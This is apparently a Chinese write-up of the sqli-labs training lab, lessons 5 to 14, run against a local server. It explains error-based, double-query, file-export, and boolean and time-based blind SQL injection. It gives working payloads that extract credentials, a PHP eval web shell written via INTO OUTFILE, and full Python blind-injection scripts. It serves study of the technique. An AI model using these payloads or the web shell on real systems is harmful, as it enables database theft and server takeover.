<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">| 15 | admin    | admin      |</span><br><span class="line">| 16 | admin    | admin      |</span><br><span class="line">| 17 | admin    | admin      |</span><br><span class="line">| 18 | admin    | admin      |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">17 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select username,count(*) from users group by username;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | count(*) |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    |        5 |</span><br><span class="line">| admin1   |        1 |</span><br><span class="line">| admin2   |        1 |</span><br><span class="line">| admin3   |        1 |</span><br><span class="line">| admin4   |        1 |</span><br><span class="line">| Angelina |        1 |</span><br><span class="line">| batman   |        1 |</span><br><span class="line">| dhakkan  |        1 |</span><br><span class="line">| Dumb     |        1 |</span><br><span class="line">| Dummy    |        1 |</span><br><span class="line">| secure   |        1 |</span><br><span class="line">| stupid   |        1 |</span><br><span class="line">| superman |        1 |</span><br><span class="line">+----------+----------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p><strong>sql</strong>查询在使用<strong>group
by()</strong>这个函数分组的时候，会建立一张虚拟表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+----------+</span><br><span class="line">| username | count(*) |</span><br><span class="line">+----------+----------+</span><br><span class="line">|          |          |</span><br><span class="line">|          |          |</span><br><span class="line">|          |          |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
<p>然后开始查询数据库，取出数据库数据看虚拟表中是否存在。</p>
<p>不存在则将要分组的数据插入虚拟表中以待最后输出，存在则执行<strong>count++</strong>。</p>
<h5 id="x05-rand0函数">0x05 rand(0)函数</h5>
<p><strong>rand()</strong>函数在查询的时候使用时会被执行多次计算结果值，且当种子值固定时，**floor(rand(0)*2)<strong>得出的值是也是固定的，为</strong>011011001110111**……【画重点。</p>
<p>而上文的多次计算结果值这个操作，即使用<strong>group
by()</strong>分组的时候计算一次，倘若虚拟表中无该字段，则插入表中的时候再次计算一次。</p>
<p>先取第一条记录，第一次计算<strong>floor(rand(0)<em>2)=0<strong>，虚拟表中无第一条记录，于是插入的时候第二次计算</strong>floor(rand(0)</em>2)=1</strong>，然后将结果插入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand(0)*2) | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
<p>取第二条记录，第三次计算**floor(rand(0)*2)=1<strong>，这时虚拟表中已经存在</strong>1<strong>，则执行</strong>count++**。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand(0)*2) | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        2 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
<p>再取第三条记录，第四次计算<strong>floor(rand(0)<em>2)=0<strong>，此时查询虚拟表中并不存在</strong>0<strong>，也就是无此记录，因此插入的时候开始第五次计算</strong>floor(rand(0)</em>2)=1</strong>。</p>
<p>这时报错原理出来了。</p>
<p>第五次计算得出的**floor(rand(0)*2)=1<strong>在插入时因为同之前已经插入过的</strong>1**重复，故抛出了报错信息。</p>
<p>取三条数据，五次计算，因此使用<strong>rand(0)</strong>时至少需要三条以上数据才会报错。</p>
<h5 id="x06-rand函数">0x06 rand()函数</h5>
<p>相对于<strong>floor(rand(0)<em>2)<strong>而言，</strong>floor(rand()</em>2)</strong>由于没有加入随机因子所以计算的值是不固定的。</p>
<p>取第一条记录，第一次计算<strong>floor(rand()<em>2)=0<strong>，虚拟表中无第一条记录，于是插入的时候第二次计算</strong>floor(rand()</em>2)=1</strong>，然后将结果插入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand()*2)  | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
<p>取第二条记录，第三次计算<strong>floor(rand()<em>2)=0<strong>，这时虚拟表中不存在</strong>0<strong>，则插入时第四次计算</strong>floor(rand()</em>2)=1</strong>，冲突报错。</p>
<p>但是倘若在前几次由于随机性，例如在上述步骤的第四次插入计算时**floor(rand()*2)=0**，查询出来的虚拟表成了这样。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------+----------+</span><br><span class="line">| floor(rand()*2)  | count(*) |</span><br><span class="line">+------------------+----------+</span><br><span class="line">| 1                |        1 |</span><br><span class="line">| 0                |        1 |</span><br><span class="line">|                  |          |</span><br><span class="line">+------------------+----------+</span><br></pre></td></tr></table></figure>
<p>那么后面不论查询几次都不会报错了，然后看题。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select database()),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;security-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<p>再构造语句查询表名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;users-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<p>后面几乎和之前的一样，只要构造嵌套的第二个select语句即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,2,count(*) as a from information_schema.tables group by concat((select column_name from information_schema.columns where  table_name=&#x27;users&#x27; limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;id-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<p>这样从爆出全部字段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-5/?id=1&#x27; union select 1,1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27; &#x27;,password) from users limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;Dumb Dumb-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<h4 id="less-6-基于双查询的get双引号字符型注入">Less-6
基于双查询的GET双引号字符型注入</h4>
<p>一如<strong>Less-2</strong>相对于<strong>Less-1</strong>一样，同<strong>Less-5</strong>的<strong>payload</strong>差不多，改单引号为双引号即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-6/?id=1&quot; union select 1,1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27; &#x27;,password) from users limit 0,1),&#x27;-----&#x27;, floor(rand(0)*2)) --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan</span><br><span class="line"></span><br><span class="line">Duplicate entry &#x27;Dumb Dumb-----1&#x27; for key &#x27;group_key&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="x02-get导出文件注入">0x02 GET导出文件注入</h3>
<h4 id="less-7-基于导出文件的get注入">Less-7 基于导出文件的GET注入</h4>
<h5 id="相关补充-1">相关补充</h5>
<h6 id="load_file">load_file()</h6>
<p>该函数会读取文件并返回该文件的内容作为一个字符串，但有使用条件的限制。</p>
<ol type="1">
<li>必须有权限读取并且文件必须完全可读，**and (select count(*) from
mysql.user)&gt;0**返回正常结果即有读写权限，反之亦然。</li>
<li>欲读取文件必须在服务器上且需指定完整路径。</li>
<li>欲读取文件必须小于<strong>max_allowed_packet</strong>。</li>
</ol>
<h6 id="load-data-infile">load data infile</h6>
<p>该函数会从文件中读取行然后存入表中，当错误代码是<strong>2</strong>的时候的时候，文件不存在，错误代码为<strong>13</strong>的时候，没有权限。</p>
<h6 id="select-...-into-outfile-file_name">select ... into outfile
'file_name'</h6>
<p>该函数会将查询到的结果写入文件。</p>
<p>回到题目。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-7/?id=1&#x27;)) union select 1,2,3 into outfile &#x27;/var/www/html/Less-7/1.txt&#x27; --+</span><br><span class="line"></span><br><span class="line">Welcome    Dhakkan </span><br><span class="line"></span><br><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure>
<p>虽然报错，但是访问该文件以及可以读取到注出的数据了，甚至可以写入小🐎。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:2333/Less-7/?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_post[&quot;south&quot;])?&gt;&#x27; into outfile &#x27;/var/www/html/Less-7/1.txt&#x27; --+</span><br></pre></td></tr></table></figure>
<h3 id="x03-get单查询盲注">0x03 GET单查询盲注</h3>
<h4 id="less-8-基于布尔的get单引号字符型盲注">Less-8
基于布尔的GET单引号字符型盲注</h4>
<p>根据提示，这是布尔盲注，即在不知道数据库返回值的情况下对数据库进行注入攻击，几个简单函数就不做赘述了。</p>
<p>脚本跑出数据库名，这儿使用二分法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(length(database())=&#123;length&#125;,1,0) --+&quot;</span></span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(length=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, i + <span class="number">1</span>):</span><br><span class="line">            <span class="built_in">min</span> = <span class="number">48</span></span><br><span class="line">            <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">            <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">                payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((database()),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                    r = requests.get(url=url + payload.<span class="built_in">format</span>(position=<span class="built_in">str</span>(j), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        mid = <span class="built_in">max</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                    r = requests.get(url=url + payload.<span class="built_in">format</span>(position=<span class="built_in">str</span>(j), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        <span class="built_in">min</span> = mid</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="built_in">max</span> = mid</span><br><span class="line">            result += <span class="built_in">chr</span>(mid)</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>获取表名。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>获取表中字段数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select count(column_name) from information_schema.columns where table_schema=&#x27;eight&#x27; and table_name=&#x27;flag&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and (&#123;command&#125;)=&#123;position&#125; --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>获取表中字段名。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">40</span>):</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到全部字段。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-8/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,1,0) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="comment"># print i</span></span><br><span class="line">        <span class="built_in">min</span> = <span class="number">0</span></span><br><span class="line">        <span class="built_in">max</span> = <span class="number">255</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">min</span> &lt; <span class="built_in">max</span>:</span><br><span class="line">            <span class="comment"># 注出第一个表的表名</span></span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&#123;operator&#125;&#123;mid&#125;,1,0) --+&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">max</span> - <span class="built_in">min</span> == <span class="number">1</span>:</span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;=&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    mid = <span class="built_in">max</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">                r = requests.get(</span><br><span class="line">                    url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), operator=<span class="string">&quot;&gt;&quot;</span>, mid=<span class="built_in">str</span>(mid)))</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="built_in">min</span> = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">max</span> = mid</span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h4 id="less-9-基于时间的get单引号字符型盲注">Less-9
基于时间的GET单引号字符型盲注</h4>
<p>在没有任何输出显示的时候，可以使用时间盲注，利用数据库的延时语句来注入，脚本和上一题大同小异，使用了<strong>sleep()</strong>函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-9/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">command = <span class="string">&quot;select group_concat(username,&#x27; &#x27;,password) from users&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    startTime = time.time()</span><br><span class="line">    payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))&gt;0,sleep(2),1) --+&quot;</span></span><br><span class="line">    r = requests.get(url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and if(ascii(substr((&#123;command&#125;),&#123;position&#125;,1))=&#123;mid&#125;,sleep(2),1) --+&quot;</span></span><br><span class="line">            startTime = time.time()</span><br><span class="line">            r = requests.get(</span><br><span class="line">                url=url + payload.<span class="built_in">format</span>(command=command, position=<span class="built_in">str</span>(i), mid=<span class="built_in">str</span>(j)))</span><br><span class="line">            <span class="keyword">if</span> time.time() - startTime &gt; <span class="number">2</span>:</span><br><span class="line">                result += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        sys.stdout.write(<span class="string">&quot;\r%s&quot;</span> % result)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h4 id="less-10-基于时间的get双引号字符型盲注">Less-10
基于时间的GET双引号字符型盲注</h4>
<p>。。没啥好说的，改个双引号闭合就行了。</p>
<h3 id="x04-post单查询注入">0X04 POST单查询注入</h3>
<h4 id="less-11-基于错误的post单引号字符型注入">Less-11
基于错误的POST单引号字符型注入</h4>
<p>和<strong>Less-1</strong>大同小异，把<strong>get</strong>换成<strong>post</strong>罢了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-11/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&quot;-1&#x27; union select 1,group_concat(username,&#x27;,&#x27;,password,&#x27;\n&#x27;) from users #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<h4 id="less-12-基于错误的post双引号变形字符型注入">Less-12
基于错误的POST双引号变形字符型注入</h4>
<p>和<strong>Less-4</strong>大同小异，把<strong>get</strong>换成<strong>post</strong>罢了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-12/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&#x27;-1&quot;) union select 1,group_concat(username,&quot;,&quot;,password,&quot;\n&quot;) from users #&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<h3 id="x05-post双查询注入">0X05 POST双查询注入</h3>
<h4 id="less-13-基于双查询的post单引号变形字符型注入">Less-13
基于双查询的POST单引号变形字符型注入</h4>
<p>原理同<strong>Less-5</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:2333/Less-13/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;uname&quot;</span>: <span class="string">&quot;-1&#x27;) union select 1,count(*) as a from information_schema.tables group by concat((select concat(username,&#x27;,&#x27;,password) from users limit 0,1),&#x27; &#x27;, floor(rand(0)*2)) #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = requests.post(url=url, data=data)</span><br><span class="line"><span class="built_in">print</span> r.text</span><br></pre></td></tr></table></figure>
<h4 id="less-14-基于双查询的post双引号字符型注入">Less-14
基于双查询的POST双引号字符型注入</h4>
